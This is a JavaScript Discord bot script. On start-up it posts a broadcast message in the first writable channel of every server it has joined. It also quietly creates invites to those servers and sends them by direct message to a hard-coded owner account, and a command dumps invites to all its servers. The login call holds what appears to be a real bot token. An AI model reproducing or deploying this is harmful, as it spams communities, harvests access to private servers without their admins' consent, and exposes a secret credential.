const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js')
const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
    ]
})

function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
        currentDate = Date.now();
    } while (currentDate - date < milliseconds);
}

function EmbedCreate(title, description, fields)
{
    const embed =
    {
        color: 3106352,
        title: title,
        description: description,
        fields: fields,
    }
    return embed;
}

let ownerId = "597755189486944256";

bot.on('ready', async () => {
    console.log(`Запустился бот ${bot.user.username}`);
    
    let guilds = await bot.guilds.cache.toJSON();
    let owner = await bot.users.fetch(ownerId);
    for (let i = 0; i < guilds.length; i++) {
        let member = await guilds[i].members.fetch(bot.user.id);

        let channels = guilds[i].channels.cache.toJSON();
        channels.sort((prev, next) => prev.rawPosition - next.rawPosition);
        for (let j = 0; j < channels.length; j++)  {  
            if (channels[j].type == 0) {
                if (channels[j].permissionsFor(member).has(PermissionsBitField.Flags.ViewChannel)) {
                    if (channels[j].permissionsFor(member).has(PermissionsBitField.Flags.SendMessages)) {
                        console.log(guilds[i].name);
                        channels[j].send("**Рассылка**");

                        if (ownerId != "") {
                            let invite = await channels[j].createInvite({ temporary: true });
                            owner.send(`https://discord.gg/${invite.code}`);
                        }


                        sleep(1200);
                        break;
                    }
                }
            }
        }
    }
    console.log("Готово!");
});

bot.on('message', async msg => {
    if (msg.content.startsWith('_generateInviteAll')) {
        let servers = await bot.guilds.cache.toJSON();
        console.log("=================================================\nСТАРТ\n=================================================");
        for (let i = 0; i < servers.length; i++) {
            servers[i].channels.cache.random().createInvite({ temporary: true })
                .then(inv => msg.channel.send(`https://discord.gg/${inv.code}`))
                .catch(console.log(servers[i].name + " --- ошибка"));
        }
        console.log("=================================================\nКОНЕЦ\n=================================================");
    } else if (msg.content.startsWith('_bot')) {
        let servers = bot.guilds.cache.map(g => g.id);
        msg.reply(`**${servers.length}** серверов`);
    }
});






bot.login("NzU4MzY2MTI1NjY2MzM2Nzc4.GkoefG.Mhgjx70xWlD_yDAw3bfBGVH9SzlxUS6KLVvqf4");